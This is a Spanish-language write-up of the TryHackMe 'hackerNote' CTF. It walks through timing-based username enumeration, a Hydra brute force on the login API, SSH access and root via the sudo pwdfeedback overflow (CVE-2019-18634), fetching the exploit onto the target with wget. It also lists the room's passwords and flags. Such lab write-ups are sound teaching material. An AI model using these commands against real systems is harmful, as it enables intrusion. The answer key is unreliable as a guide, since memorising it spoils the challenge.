# hackerNote

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF | hackernote | https://tryhackme.com/room/hackernote | 02 Level Medium | TryHackMe | Webapp Golang, nmap, username enumeration, hydra, wordlists (combinator), CVE-2019-18634 | Compromiso total (root) vía privesc por pwdfeedback |

---

**Contexto:** **hackerNote** es un CTF de dificultad Medium sobre una aplicación web custom escrita en Go. Expone una API de login (`/api/user/login`) con una diferencia de timing entre usuario inexistente y contraseña incorrecta, lo que permite enumerar usuarios válidos. Con el usuario `james` se genera una wordlist custom (color + número) y se fuerza la contraseña `blue7` con Hydra, para luego leer una nota con las credenciales SSH. En la fase final se abusa del parámetro `pwdfeedback` de sudo (CVE-2019-18634) para conseguir root. The whole room is custom webapp exploitation: user enumeration, custom wordlists and a basic privilege escalation exploit.

## Solucionario

### Task 1: Reconnaissance

**Explicación:** Se escanea la máquina con `nmap` para descubrir los puertos abiertos (22, 80 y 8080). El puerto 8080 alberga la aplicación web; el análisis del tráfico revela que el backend está escrito en Go.

```bash
nmap -sS -sV <IP>
```

Respuestas de la tarea:

1. `22,80,8080`
2. `go`

### Task 2: Investigate

**Explicación:** Se prueba a iniciar sesión con un usuario inválido (el error aparece al instante) y con una contraseña incorrecta sobre una cuenta válida (el error tarda unos segundos). Esa diferencia de timing en los mensajes de error permite enumerar cuentas de usuario existentes.

Respuestas de la tarea:

1. `No answer needed`
2. `No answer needed`
3. `No answer needed`
4. `No answer needed`
5. `No answer needed`

### Task 3: Exploit

**Explicación:** El login es un POST a `/api/user/login`. Se aprovecha la diferencia de timing para enumerar nombres de usuario válidos con un script (Python/CURL): se envían peticiones con `names.txt` y se marcan como válidos los que tardan significativamente más. De la lista de usuarios solo es válido `james`.

```python
import time, json, requests
URL = "http://<IP>:8080/api/user/login"
USERNAME_FILE = open("names.txt", "r")
# ... leer nombres, medir tiempos de respuesta ...
# los que tardan >= 0.9 * max_time son válidos
```

Respuestas de la tarea:

1. `No answer needed`
2. `1`
3. `james`

### Task 4: Attack Passwords

**Explicación:** Con el usuario encontrado se recupera la pista de la contraseña. Como las contraseñas están hasheadas con bcrypt, no es viable rockyou; se combinan dos wordlists (colores + números) con `combinator` de hashcat-utils y se ataca el endpoint de login con Hydra. El password de la web es `blue7`; dentro de la app hay una nota con la contraseña SSH `dak4ddb37b`. Logeado por SSH se obtiene la user flag.

```bash
./combinator.bin ../../colors.txt ../../numbers.txt > ../../word.txt
wc -l wordlist.txt
hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
ssh james@<IP>
```

Respuestas de la tarea:

1. `No answer needed`
2. `180`
3. `blue7`
4. `No answer needed`
5. `dak4ddb37b`
6. `No answer needed`
7. `thm{56911bd7ba1371a3221478aa5c094d68}`

### Task 5: Privilege Escalation

**Explicación:** Tras conseguir shell como `james`, `sudo -l` muestra que no puede ejecutar nada como root, pero al pedir la contraseña aparecen asteriscos: la opción `pwdfeedback` está activa. Esa configuración es vulnerable a CVE-2019-18634 (buffer overflow). Se compila el exploit (`sudo-cve-2019-18634`), se transfiere a la máquina y se ejecuta para obtener root y leer la root flag.

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
make exploit
python3 -m http.server 8000
# en la máquina víctima:
wget http://<LHOST>:8000/exploit
chmod +x exploit
./exploit
cat /root/root.txt
```

Respuestas de la tarea:

1. `CVE-2019-18634`
2. `No answer needed`
3. `No answer needed`
4. `No answer needed`
5. `No answer needed`
6. `thm{af55ada6c2445446eb0606b5a2d3a4d2}`

### Task 6

**Explicación:** Tarea de finalización/cierre de la sala; no requiere respuesta.

Respuestas de la tarea:

1. `No answer needed`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Which ports are open? (in numerical order) | `22,80,8080` |
| 1.2 | What programming language is the backend written in? | `go` |
| 2.1 | Try and log in to an invalid user account | `No answer needed` |
| 2.2 | Try and log in to your account, with an incorrect password | `No answer needed` |
| 2.3 | Notice the timing difference. This allows user enumeration | `No answer needed` |
| 2.4 | Pregunta 4 (investigación de la app) | `No answer needed` |
| 2.5 | Pregunta 5 (investigación de la app) | `No answer needed` |
| 3.1 | Crear/ejecutar el script de enumeración | `No answer needed` |
| 3.2 | How many usernames from the list are valid? | `1` |
| 3.3 | What are/is the valid username(s)? | `james` |
| 4.1 | Form the hydra command to attack the login API route | `No answer needed` |
| 4.2 | How many passwords were in your wordlist? | `180` |
| 4.3 | What was the user's password? | `blue7` |
| 4.4 | Login as the user to the platform | `No answer needed` |
| 4.5 | What's the user's SSH password? | `dak4ddb37b` |
| 4.6 | Log in as the user to SSH with the credentials you have. | `No answer needed` |
| 4.7 | What's the user flag? | `thm{56911bd7ba1371a3221478aa5c094d68}` |
| 5.1 | What is the CVE number for the exploit? | `CVE-2019-18634` |
| 5.2 | Pregunta 2 (explotación pwdfeedback) | `No answer needed` |
| 5.3 | Pregunta 3 (explotación pwdfeedback) | `No answer needed` |
| 5.4 | Pregunta 4 (explotación pwdfeedback) | `No answer needed` |
| 5.5 | Pregunta 5 (explotación pwdfeedback) | `No answer needed` |
| 5.6 | What is the root flag? | `thm{af55ada6c2445446eb0606b5a2d3a4d2}` |
| 6.1 | Pregunta de cierre | `No answer needed` |

---

**Metodología:** Reconocimiento de puertos (nmap), fingerprint del backend (Go), entendimiento de la respuesta del login (timing), enumeración de usuarios por timing, generación de wordlist con combinador de hashes, fuerza bruta con Hydra sobre `/api/user/login`, lectura de credenciales en nota, acceso SSH y escalada por buffer overflow del pwdfeedback de sudo (PTES: reconnaissance, vulnerability research, exploitation, privilege escalation).

**Learning chain:** nmap (22/80/8080) → backend Go → timing en login → enumeración de usuarios → james → combinator (color+número) → hydra -> blue7 → nota con SSH password → dak4ddb37b → user flag → sudo pwdfeedback → CVE-2019-18634 → root flag.

**Lección:** *Las diferencias de tiempo en las respuestas de login (timing side-channel) son una vía real de enumeración de usuarios, y una única opción insegura de sudo (pwdfeedback) puede convertir una shell de usuario en root.*

**MITRE ATT&CK:** T1046 Network Service Discovery · T1078 Valid Accounts · T1110.001 Password Guessing (hydra) · T1110.002 Password Cracking · T1059.004/006 Command and Scripting Interpreter · T1068 Exploitation for Privilege Escalation (CVE-2019-18634).

**Fuente:** [TryHackMe - hackerNote](https://tryhackme.com/room/hackernote)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.